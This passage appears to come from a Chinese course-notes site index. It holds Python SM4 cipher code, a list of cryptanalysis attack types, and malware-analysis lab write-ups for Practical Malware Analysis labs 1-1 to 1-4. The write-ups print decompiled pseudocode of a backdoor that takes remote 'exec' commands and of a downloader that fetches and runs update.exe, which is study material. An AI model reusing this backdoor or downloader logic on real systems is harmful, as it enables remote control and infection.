bytes.fromhex(z.decode(\u0026#39;utf8\u0026#39;))] ha = \u0026#34;\u0026#34; for i in range(rcnt): msg = zin + [i for i in binascii.a2b_hex((\u0026#39;%08x\u0026#39; % ct).encode(\u0026#39;utf8\u0026#39;))] ha = ha + sm3_hash(msg) ct += 1 return ha[0: klen * 2] "},{"id":121,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%9B%BD%E5%AF%86%E7%AE%97%E6%B3%95/sm4/","title":"Sm4","section":"国密算法","content":"SM 4 #  直接上代码（github）：\n#-*-coding:utf-8-*- import copy from .func import xor, rotl, get_uint32_be, put_uint32_be, \\ bytes_to_list, list_to_bytes, padding, unpadding #Expanded SM4 box table SM4_BOXES_TABLE = [ 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c, 0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86, 0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed, 0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa, 0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c, 0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb, 0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25, 0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52, 0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38, 0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34, 0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82, 0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x37,0x45, 0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,0x8d,0x1b,0xaf, 0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,0x0a,0xc1, 0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,0x89, 0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39, 0x48, ] # System parameter SM4_FK = [0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc] # fixed parameter SM4_CK = [ 0x00070e15,0x1c232a31,0x383f464d,0x545b6269, 0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9, 0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249, 0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9, 0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229, 0x30373e45,0x4c535a61,0x686f767d,0x848b9299, 0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209, 0x10171e25,0x2c333a41,0x484f565d,0x646b7279 ] SM4_ENCRYPT = 0 SM4_DECRYPT = 1 class CryptSM4(object): def __init__(self, mode=SM4_ENCRYPT): self.sk = [0]*32 self.mode = mode # Calculating round encryption key. # args: [in] a: a is a 32 bits unsigned value; # return: sk[i]: i{0,1,2,3,...31}. @classmethod def _round_key(cls, ka): b = [0, 0, 0, 0] a = put_uint32_be(ka) b[0] = SM4_BOXES_TABLE[a[0]] b[1] = SM4_BOXES_TABLE[a[1]] b[2] = SM4_BOXES_TABLE[a[2]] b[3] = SM4_BOXES_TABLE[a[3]] bb = get_uint32_be(b[0:4]) rk = bb ^ (rotl(bb, 13)) ^ (rotl(bb, 23)) return rk # Calculating and getting encryption/decryption contents. # args: [in] x0: original contents; # args: [in] x1: original contents; # args: [in] x2: original contents; # args: [in] x3: original contents; # args: [in] rk: encryption/decryption key; # return the contents of encryption/decryption contents. @classmethod def _f(cls, x0, x1, x2, x3, rk): # \u0026#34;T algorithm\u0026#34; == \u0026#34;L algorithm\u0026#34; + \u0026#34;t algorithm\u0026#34;. # args: [in] a: a is a 32 bits unsigned value; # return: c: c is calculated with line algorithm \u0026#34;L\u0026#34; and nonline algorithm \u0026#34;t\u0026#34; def _sm4_l_t(ka): b = [0, 0, 0, 0] a = put_uint32_be(ka) b[0] = SM4_BOXES_TABLE[a[0]] b[1] = SM4_BOXES_TABLE[a[1]] b[2] = SM4_BOXES_TABLE[a[2]] b[3] = SM4_BOXES_TABLE[a[3]] bb = get_uint32_be(b[0:4]) c = bb ^ (rotl(bb, 2)) ^ (rotl(bb, 10)) ^ (rotl(bb, 18)) ^ (rotl(bb, 24)) return c return (x0 ^ _sm4_l_t(x1 ^ x2 ^ x3 ^ rk)) def set_key(self, key, mode): key = bytes_to_list(key) MK = [0, 0, 0, 0] k = [0]*36 MK[0] = get_uint32_be(key[0:4]) MK[1] = get_uint32_be(key[4:8]) MK[2] = get_uint32_be(key[8:12]) MK[3] = get_uint32_be(key[12:16]) k[0:4] = xor(MK[0:4], SM4_FK[0:4]) for i in range(32): k[i + 4] = k[i] ^ ( self._round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i])) self.sk[i] = k[i + 4] self.mode = mode if mode == SM4_DECRYPT: for idx in range(16): t = self.sk[idx] self.sk[idx] = self.sk[31 - idx] self.sk[31 - idx] = t def one_round(self, sk, in_put): out_put = [] ulbuf = [0]*36 ulbuf[0] = get_uint32_be(in_put[0:4]) ulbuf[1] = get_uint32_be(in_put[4:8]) ulbuf[2] = get_uint32_be(in_put[8:12]) ulbuf[3] = get_uint32_be(in_put[12:16]) for idx in range(32): ulbuf[idx + 4] = self._f(ulbuf[idx], ulbuf[idx + 1], ulbuf[idx + 2], ulbuf[idx + 3], sk[idx]) out_put += put_uint32_be(ulbuf[35]) out_put += put_uint32_be(ulbuf[34]) out_put += put_uint32_be(ulbuf[33]) out_put += put_uint32_be(ulbuf[32]) return out_put def crypt_ecb(self, input_data): # SM4-ECB block encryption/decryption input_data = bytes_to_list(input_data) if self.mode == SM4_ENCRYPT: input_data = padding(input_data) length = len(input_data) i = 0 output_data = [] while length \u0026gt; 0: output_data += self.one_round(self.sk, input_data[i:i+16]) i += 16 length -= 16 if self.mode == SM4_DECRYPT: return list_to_bytes(unpadding(output_data)) return list_to_bytes(output_data) def crypt_cbc(self, iv, input_data): #SM4-CBC buffer encryption/decryption i = 0 output_data = [] tmp_input = [0]*16 iv = bytes_to_list(iv) if self.mode == SM4_ENCRYPT: input_data = padding(bytes_to_list(input_data)) length = len(input_data) while length \u0026gt; 0: tmp_input[0:16] = xor(input_data[i:i+16], iv[0:16]) output_data += self.one_round(self.sk, tmp_input[0:16]) iv = copy.deepcopy(output_data[i:i+16]) i += 16 length -= 16 return list_to_bytes(output_data) else: length = len(input_data) while length \u0026gt; 0: output_data += self.one_round(self.sk, input_data[i:i+16]) output_data[i:i+16] = xor(output_data[i:i+16], iv[0:16]) iv = copy.deepcopy(input_data[i:i + 16]) i += 16 length -= 16 return list_to_bytes(unpadding(output_data)) "},{"id":122,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","title":"攻击方法","section":"密码学","content":"README #  这里我们根据攻击者获取密码学系统的信息的多少将攻击模式分为以下几类\n 唯密文攻击：攻击者仅能获得一些加密过的密文。 已知明文攻击：攻击者有一些密文对应的明文。 选择明文攻击：攻击者在开始攻击时可以选择一些明文，并获取加密后的密文。如果攻击者在攻击中途可以根据已经获取的信息选择新的明文并获取对应的密文，则称为适应性选择明文攻击。 选择密文攻击：攻击者在开始攻击之前可以选择一些密文，并获取解密后的明文。如果攻击者在攻击图中可以根据已经获取的信息选择一些新的密文并获取对应的明文，则称为适应性选择密文攻击。 相关密钥攻击：攻击者可以获得两个或多个相关密钥的加密或解密后的密文或明文。但是攻击者不知道这些密钥。  根据不同的攻击模式，可能会有不同的攻击方法，目前常见的攻击方法主要有\n 暴力攻击、中间相遇攻击、线性分析、差分分析、不可能差分分析、积分分析、代数分析、相关密钥攻击、侧信道攻击  "},{"id":123,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-1/","title":"Lab1 1","section":"01","content":"lab 1-1 #  QUESTION 1 #   Upload the files to http://www.VirusTotal.com/ and view the reports. Does either file match any existing antivirus signatures?\n 文件上传的 sha256 hash 值为：\n$ sha256sum Lab01-01.exe 58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47 Lab01-01.exe 因此上传的 url 为：https://www.virustotal.com/#/file/58898bd42c5bd3bf9b1389f0eee5b39cd59180e8370eb9ea838a0b327bd6fe47/detection\n可以看到许多病毒引擎都检测到这是一个木马。\nQUESTION 2 #   When were these files compiled?\n PE 文件的文件结构可以参考微软的官方文档。\n可以找到在对象文件的的最开始，存在一个标准文件头，其中有一个 TimeDateStamp 域，指示了文件创建时的时间戳，可以使用以下的 python 脚本读取它：\n# lab1-1-2.py from datetime import datetime import pefile pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) print(datetime.fromtimestamp(pe.FILE_HEADER.TimeDateStamp)) $ python lab1-1-2.py 2010-12-20 00:16:19 QUESTION 3 #   Are there any indications that either of these files is packed or obfuscated? If so, what are these indicators?\n packerid #  安装 BlackArch 的工具 packerid：\n$ sudo pacman -S packerid 这是一个基于字节码特征匹配打包程序的命令行工具。\n  字节码特征我们使用 pefile 这个 python 开源库中的数据库：https://github.com/sooshie/packerid/blob/master/userdb.txt\n（另外我在运行程序时发现了一个报错，原因是字节码特征中出现了 V3 这类的字节码，暂时还不清楚这个字节码的含义是什么）\n  字节码文件保存在 /usr/share/packerid/userdb.txt 文件夹中\n  直接指定文件路径来分析 PE 文件：\n$ packerid /tmp/BinaryCollection/Chapter_1L/Lab01-01.exe [\u0026#39;Microsoft Visual C++ v5.0/v6.0 (MFC)\u0026#39;] pefile #  通过 pefile 也可以通过特征匹配的方式识别 PE 文件的打包方式。\n其实在第一种方法中 packerid 的底层就是使用 pefile 这个 python 的库，然后使用开源的特征库进行匹配的。此处就不手动实现了\nPEiD #  或者通过 PEiD 这个软件进行分析：\n结论 #  可以看到这是一个 VC++ MFC 打包的文件，也就是说这个文件没有加壳。\nQUESTION 4 #   Do any imports hint at what this malware does? If so, which imports are they?\n malscan #  安装 BlackArch 的工具 malscan：\n$ sudo pacman -S malscan malscan 是一个启发式静态分析工具，使用一下命令检测：\n$ malscan /tmp/BinaryCollection/Chapter_1L/Lab01-01.exe ... [Imports Overview] KERNEL32.dll 0x402000 CloseHandle 0x402004 UnmapViewOfFile 0x402008 IsBadReadPtr 0x40200c MapViewOfFile 0x402010 CreateFileMappingA 0x402014 CreateFileA 0x402018 FindClose 0x40201c FindNextFileA 0x402020 FindFirstFileA 0x402024 CopyFileA MSVCRT.dll 0x40202c malloc 0x402030 exit 0x402034 _exit 0x402038 _XcptFilter 0x40203c __p___initenv 0x402040 __getmainargs 0x402044 _initterm 0x402048 __setusermatherr 0x40204c _adjust_fdiv 0x402050 __p__commode 0x402054 __p__fmode 0x402058 __set_app_type 0x40205c _except_handler3 0x402060 _controlfp 0x402064 _stricmp ... pefile #  或者使用 pefile 先读取所有的导入函数，然后一一打印，malscan 也是使用同样的方式实现的，此处就不手动实现了。\nPE Explorer #  或者直接使用 PE Explorer 可以查看以下的导入函数结果：\n链接库的导入表分析：\n结论 #  以上分析说明 lab01-01.exe 这个可执行文件主要包含了复制和查找文件的操作。\nlab01-01.dll 这个动态链接库引用了新建进程、睡眠、创建 Mutex 等多个有关进程的操作。还导入了 WS2_32.dll 这个主要用与网络套接字建立的动态链接库。\nQUESTION 5 #   Are there any other files or host-based indicators that you could look for on infected systems?\n 从之前的动态链接库导入函数分析来看，我们可以分析主机的网络链接状态来分析主机是否感染了此病毒。\nPE Explorer #  另外我们分析可执行文件的 .data 全局数据段：\n我们发现一个叫做 kerne132.dll 的字符串，这个字符串用数字 1 代替了字母 l，貌似是想要掩盖什么东西。我们查找调用这个字符串的位置，我们发现下面的汇编指令：\n... push\t00000000h\rpush\tSSZ0040304C_C__windows_system32_kerne132_dll\rpush\tSSZ0040307C_Lab01_01_dll\rcall\t[KERNEL32.dll!CopyFileA]\r...\r结合全局数据段中的 Lab01-01.dll 这个字符串。这一段代码将同文件夹下的 Lab01-01.dll 这个静态链接库复制到了 C:/Windows/System32/kerne132.dll 这个文件。\npefile \u0026amp; capstone #  也可以用 pefile 首先读取所有段的名称和其相对偏移地址：\n#!/usr/bin/env python import pefile pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) print([(s.Name, hex(s.VirtualAddress)) for s in pe.sections]) # [(b\u0026#39;.text\\x00\\x00\\x00\u0026#39;, \u0026#39;0x1000\u0026#39;), (b\u0026#39;.rdata\\x00\\x00\u0026#39;, \u0026#39;0x2000\u0026#39;), (b\u0026#39;.data\\x00\\x00\\x00\u0026#39;, \u0026#39;0x3000\u0026#39;)] 可以看到 .data 段存在，并且其相对虚拟地址为 0x3000。然后我们通过以下的程序手动处理并读取 .data 段内的内容：\n#!/usr/bin/env python import pefile pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) data, string, offset = [], \u0026#34;\u0026#34;, 0 for index, item in enumerate(pe.sections[2].get_data()): if item != 0: string += chr(item) elif string != \u0026#34;\u0026#34;: data.append((string, hex(index))) string = \u0026#34;\u0026#34; for d in data: print(d) # ... # (\u0026#39;C:\\\\windows\\\\system32\\\\kerne132.dll\u0026#39;, \u0026#39;0x4c\u0026#39;) # ... 我们同样找到了这个字符串，其相对偏移地址为 0x4c，又因为 .data 段的虚拟地址为 0x3000，所有这个字符串的虚拟地址为 0x304c。\n然后我们通过 capstone 这个库反汇编 .text 段的内容，并查找字符串 304c 所在的指令位置：\n#!/usr/bin/env python import capstone import pefile pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-01.exe\u0026#34;) cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32) disas = cs.disasm(pe.sections[0].get_data(), pe.sections[0].VirtualAddress) call_poss, instructions = [], [] for index, ins in enumerate(disas): instructions.append(ins) if \u0026#34;304c\u0026#34; in ins.op_str: call_poss.append(index) for ind, pos in enumerate(call_poss): print(f\u0026#34;\\nCALLED POS {ind}==\u0026gt; {pos}\u0026#34;) for ins in instructions[(pos-3 if (pos \u0026gt; 3) else 0): (len(instructions) if (pos \u0026gt; len(instructions)-3) else pos+10)]: print(f\u0026#34;{hex(ins.address)}:\\t{ins.mnemonic}\\t{ins.op_str}\u0026#34;) CALLED POS 0 ==\u0026gt; 749\r0x17e5: push edx\r0x17e6: call esi\r0x17e8: push 0\r0x17ea: push 0x40304c\r0x17ef: push 0x40307c\r0x17f4: call dword ptr [0x402024]\r通过之前对链接库的分析，我们知道这个字符串作为 0x402024 这个函数（即 CopyFileA）的参数进行了调用。\n结论 #  综上，我们还可以通过 C:/Windows/System32 这个文件夹下是否存在 kerne132.dll 这个文件来判断主机是否被感染。\nQUESTION 6 #   What network-based indicators could be used to find this malware on infected machines?\n 根据前面的分析，可执行文件通过将动态链接库复制到 C:/Windows/System32 这个文件夹下，然后通过这个动态链接库进行进程、网络相关的动作，因此我们分析这个动态链接库。.data 段全局字符串：\n其中 exec 和一个 127.26.152.13 这个为 IP 地址格式的字符串非常可疑。为了分析该动态链接库的网络特征，我们查找调用第二个字符串的位置 .text:100010A3，使用 IDA Pro 分析出以下的伪代码：\n//... v3 = socket(2, 1, 6); if ( v3 != -1 ) { name.sa_family = 2; *(_DWORD *)\u0026amp;name.sa_data[2] = inet_addr(cp); *(_WORD *)name.sa_data = htons(0x50u); if ( connect(v3, \u0026amp;name, 16) != -1 ) { while ( send(v3, ::buf, strlen(::buf), 0) != -1 \u0026amp;\u0026amp; shutdown(v3, 1) != -1 ) { if ( recv(v3, \u0026amp;buf, 4096, 0) \u0026gt; 0 ) { if ( !strncmp(Str1, \u0026amp;buf, 5u) ) { Sleep(0x60000u); } else if ( !strncmp(aExec, \u0026amp;buf, 4u) ) { memset(\u0026amp;StartupInfo, 0, sizeof(StartupInfo)); StartupInfo.cb = 68; CreateProcessA(0, \u0026amp;CommandLine, 0, 0, 1, 0x8000000u, 0, 0, \u0026amp;StartupInfo, \u0026amp;ProcessInformation); } else { if ( buf == 113 ) { CloseHandle(hObject); break; } Sleep(0x60000u); } } } } closesocket(v3); } //... 其中 socket(2,1,6) 这行代码，通过查找 MSDN 的 API，我们知道这是通过与 127.26.152.13 这个远程地址，0x50 (80) 这个端口，建立一个 IPv4 的 TCP 链接。再分析下面的代码逻辑：\n 如果远程发送 sleep 这个字符串，则线程休眠； 如果远程发送 exec 这个开头的字符串，则线程会调用命令行执行这个命令。这相当于给远程反弹了一个用于任意命令执行权限的 shell； 如果远程发送 acsii 码为 113 的字符，即 q，则该套接字断开；  在 cmd 中执行以下的命令：\n$ netstat -p TCP -an | findstr 127.26.152.13 可以查找与主机 127.26.152.13 进建立的所有 TCP 连接。\nQUESTION 7 #   What would you guess is the purpose of these files?\n 通过之前的分析，这个程序的逻辑已经相当清楚了。\n可执行文件通过将同文件夹下的动态链接库复制到 C:/Windows/System32 这个文件夹下并命名为 kern132.dll。主程序调用这个动态链接库与远程地址 127.26.152.13 的 80 端口主动建立一个 TCP 链接。远程发送以 exec 开头的字符串执行任意命令，发送 q 结束进程。\n"},{"id":124,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-2/","title":"Lab1 2","section":"01","content":"lab 1-2 #  QUESTION 1 #   Upload the Lab01-02.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?\n 文件的 sha256 哈希值：\n$ sha256sum Lab01-02.exe c876a332d7dd8da331cb8eee7ab7bf32752834d4b2b54eaa362674a2a48f64a6 Lab01-02.exe 因此上传的 url 为：https://www.virustotal.com/#/file/c876a332d7dd8da331cb8eee7ab7bf32752834d4b2b54eaa362674a2a48f64a6/detection\n可以看到这同样是一个木马。\nQUESTION 2 #   Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.\n 使用 blackarch 的工具 packerid 来检测第二个可执行文件的壳：\n$ packerid Lab01-02.exe [\u0026#39;UPX v0.89.6 - v1.02 / v1.05 -v1.24 -\u0026gt; Markus \u0026amp; Laszlo [overlay]\u0026#39;] 可以看到这是一个用 UPX 简单加壳的程序。\n我们安装 upx 这个程序之后，简单地脱壳即可：\n$ sudo pacman -S upx $ upx -d Lab01-02.exe -o Lab01-02.unpack.exe Ultimate Packer for eXecutables Copyright (C) 1996 - 2018 UPX 3.95 Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 16384 \u0026lt;- 3072 18.75% win32/pe Lab01-02.unpack.exe Unpacked 1 file. $ packerid Lab01-02.unpack.exe [\u0026#39;Microsoft Visual C++ v5.0/v6.0 (MFC)\u0026#39;] 可以看到打包程序是 MFC，因此我们将这个程序成功脱壳。\nQUESTION 3 #   Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?\n 我们同样可以使用 blackarch 下的静态分析工具 malscan 分析导入表：\n$ malscan /tmp/BinaryCollection/Chapter_1L/Lab01-02.unpack.exe ... KERNEL32.DLL 0x402010 SystemTimeToFileTime 0x402014 GetModuleFileNameA 0x402018 CreateWaitableTimerA 0x40201c ExitProcess 0x402020 OpenMutexA 0x402024 SetWaitableTimer 0x402028 WaitForSingleObject 0x40202c CreateMutexA 0x402030 CreateThread ADVAPI32.dll 0x402000 CreateServiceA 0x402004 StartServiceCtrlDispatcherA 0x402008 OpenSCManagerA MSVCRT.dll 0x402038 _exit 0x40203c _XcptFilter 0x402040 exit 0x402044 __p___initenv 0x402048 __getmainargs 0x40204c _initterm 0x402050 __setusermatherr 0x402054 _adjust_fdiv 0x402058 __p__commode 0x40205c __p__fmode 0x402060 __set_app_type 0x402064 _except_handler3 0x402068 _controlfp WININET.dll 0x402070 InternetOpenUrlA 0x402074 InternetOpenA ... 可见这个可执行文件主要调用了与进程线程有关的函数、打开 URL 连接的函数。\nQUESTION 4 #   What host- or network-based indicators could be used to identify this malware on infected machines?\n 我们分析脱壳之后的文件，发现其 .data 段中有 http://www.malwareanalysis.com 这个字符串：\n再用 ida pro 查找调用这个字符串的位置，我们找到以下的伪代码：\nfor ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) ); 这其中 szAgent 这个字符串变量指的就是 Internet Explorer 8.0，而后的 szUrl 指的就是 http://www.malwareanalysisbook.com，这是一个不会停止的循环，意味着这个病毒会不断得使用 IE 浏览器打开后面的网址。\n因此我们可以通过 wireshark 抓取所有访问这个网址的流量即可。\n"},{"id":125,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-3/","title":"Lab1 3","section":"01","content":"lab 1-3 #  QUESTION 1 #   Upload the Lab01-03.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?\n 文件的 sha256 哈希值：\n$ sha256sum Lab01-03.exe 7983a582939924c70e3da2da80fd3352ebc90de7b8c4c427d484ff4f050f0aec Lab01-03.exe 因此上传的 url 为：https://www.virustotal.com/#/file/7983a582939924c70e3da2da80fd3352ebc90de7b8c4c427d484ff4f050f0aec/detection\n可以看到这同样是一个被 59 个引擎检测出来的木马。\nQUESTION 2 #   Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.\n 可以在 Windows 上通过 PEiD 这个软件检验壳：\n我们发现，这个可执行文件通过 FSG 1.0 加壳了。我们通过一个52poejie 教程 可以实现手动脱壳。\n但是我懒不想手动脱壳，在吾爱破解上找到了一个工具：\n把同文件夹下的 ./Lab01-03.pb.1.exe 更名为 ./Lab01-03.unpack.exe 然后再用 PEiD 分析，发现成功脱壳：\nQUESTION 3 #   Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?\n 我们使用 malscan 这个工具，检测脱壳之后的文件：\n$ malscan /tmp/BinaryCollection/Chapter_1L/Lab01-03.unpack.exe ... [Imports Overview] MSVCRT.dll 0x402000 __getmainargs 0x402004 _controlfp 0x402008 _except_handler3 0x40200c __set_app_type 0x402010 __p__fmode 0x402014 __p__commode 0x402018 _exit 0x40201c _XcptFilter 0x402020 exit 0x402024 __p___initenv 0x402028 _initterm 0x40202c __setusermatherr 0x402030 _adjust_fdiv OLEAUT32.dll 0x402038 None 0x40203c SysAllocString 0x402040 None OLE32.dll 0x402048 OleInitialize 0x40204c CoCreateInstance 0x402050 OleUninitialize ... 不知道这是干什么的，可能下载的脱壳机有问题。\nQUESTION 4 #   What host- or network-based indicators could be used to identify this malware on infected machines?\n 因为脱壳失败了，所以读取的字段也有问题。\n"},{"id":126,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/01/lab1-4/","title":"Lab1 4","section":"01","content":"lab 1-4 #  QUESTION 1 #   Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?\n 文件的 sha256 哈希值：\n$ sha256sum Lab01-04.exe 0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126 Lab01-04.exe 因此上传的 url 为：https://www.virustotal.com/#/file/0fa1498340fca6c562cfa389ad3e93395f44c72fd128d7ba08579a69aaf3b126/detection\n可以看到这同样是一个被 53 个引擎检测出来的木马。\nQUESTION 2 #   Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.\n 使用 blackarch 的工具 packerid：\n$ packerid Lab01-04.exe [\u0026#39;Microsoft Visual C++ v5.0/v6.0 (MFC)\u0026#39;] 可见这个文件并没有加壳。\nQUESTION 3 #   When was this program compiled?\n PE 文件的文件结构可以参考微软的官方文档。\n可以找到在对象文件的的最开始，存在一个标准文件头，其中有一个 TimeDateStamp 域，指示了文件创建时的时间戳，可以使用以下的 python 脚本读取它：\n#！/usr/bin/env python3 from datetime import datetime import pefile pe = pefile.PE(\u0026#34;/tmp/BinaryCollection/Chapter_1L/Lab01-04.exe\u0026#34;) print(datetime.fromtimestamp(pe.FILE_HEADER.TimeDateStamp)) $ python labb01-04.exe 2019-08-31 06:26:59 QUESTION 4 #   Do any imports hint at this program’s functionality? If so, which imports are they and what do they tell you?\n 使用 blackarch 的工具 malscan：\n$ malscan Lab01-04.exe ... [Imports Overview] KERNEL32.dll 0x402010 GetProcAddress 0x402014 LoadLibraryA 0x402018 WinExec 0x40201c WriteFile 0x402020 CreateFileA 0x402024 SizeofResource 0x402028 CreateRemoteThread 0x40202c FindResourceA 0x402030 GetModuleHandleA 0x402034 GetWindowsDirectoryA 0x402038 MoveFileA 0x40203c GetTempPathA 0x402040 GetCurrentProcess 0x402044 OpenProcess 0x402048 CloseHandle 0x40204c LoadResource ADVAPI32.dll 0x402000 OpenProcessToken 0x402004 LookupPrivilegeValueA 0x402008 AdjustTokenPrivileges MSVCRT.dll 0x402054 _snprintf 0x402058 _exit 0x40205c _XcptFilter 0x402060 exit 0x402064 __p___initenv 0x402068 __getmainargs 0x40206c _initterm 0x402070 __setusermatherr 0x402074 _adjust_fdiv 0x402078 __p__commode 0x40207c __p__fmode 0x402080 __set_app_type 0x402084 _except_handler3 0x402088 _controlfp 0x40208c _stricmp ... 可见这个可执行文件导入了，执行命令、复制移动写文件、读取文件资源大小、读取文件树、打开关闭进程等危险函数，猜测这是实现了一个了文件查看器的恶意病毒。\nQUESTION 5 #   What host- or network-based indicators could be used to identify this malware on infected machines?\n 我们用 ida pro 打开这个可执行文件，先查看它里面的字符串：\n我们发现 \\\\system32\\\\wupdmgr.exe 这样一个字符串，我们查找调用的位置，并查看调用位置的伪代码：\n// ...  GetWindowsDirectoryA(\u0026amp;Buffer, 0x10Eu); snprintf(\u0026amp;Dest, 0x10Eu, Format, \u0026amp;Buffer, aSystem32Wupdmg); hModule = GetModuleHandleA(0); hResInfo = FindResourceA(hModule, Name, Type); lpBuffer = LoadResource(hModule, hResInfo); nNumberOfBytesToWrite = SizeofResource(hModule, hResInfo); hFile = CreateFileA(\u0026amp;Dest, 0x40000000u, 1u, 0, 2u, 0, 0); WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, \u0026amp;NumberOfBytesWritten, 0); CloseHandle(hFile); return WinExec(\u0026amp;Dest, 0); } 这段代码的大致用处应该是加载一个可执行文件的资源，然后把这个可执行文件资源复制到一个给定的位置（即 \\\\system32\\\\wupdmgr.exe），然后执行它。这并没有网络相关请求。\n于是我们通过 binwalk 命令提取出其中的资源：\n$ binwalk --dd=\u0026#34;.*\u0026#34; Lab01-04.exe DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Microsoft executable, portable (PE) 16480 0x4060 Microsoft executable, portable (PE) 这条命令将给定文件 Lab01-04.exe 中的资源提取到了文件夹 _Lab01-04.exe.extracted 中。\n$ cd _Lab01-04.exe.etracted/ $ ls 0 4060 我们发现提取出了 0 和 4060 这两个资源，很显然 0 即为之前分析的可执行文件，我们再用 ida pro 分析其中的资源文件 4060：\n我们发现了一个 URL 地址，并且我们还在导入表中发现了 URLDownloadToFileA 这个导入函数，我们再分析调用这个字符串位置的伪代码：\n// ...  GetTempPathA(0x10Eu, \u0026amp;Buffer); snprintf(\u0026amp;Dest, 0x10Eu, Format, \u0026amp;Buffer, aWinupExe); WinExec(\u0026amp;Dest, 5u); GetWindowsDirectoryA(\u0026amp;v7, 0x10Eu); snprintf(\u0026amp;CmdLine, 0x10Eu, aSS_0, \u0026amp;v7, aSystem32Wupdmg); if ( !URLDownloadToFileA(0, aHttpWwwPractic, \u0026amp;CmdLine, 0, 0) ) WinExec(\u0026amp;CmdLine, 0); return 0; } 这个段伪代码，向 http://www.practicalmalwareanalysis.com/update.exe，下载病毒资源文件并且保存到 \\\\system32\\\\wupdmgrd.exe 这个文件中。\n所以需要监测网络中是否与 http://www.practicalmalwareanalysis.com/update.exe 建立了连接。\nQUESTION 6 #   This file has one resource in the resource section. Use Resource Hacker to examine that resource, and then use it to extract the resource. What can you learn from the resource?\n 在第五问中已经使用 binwalk 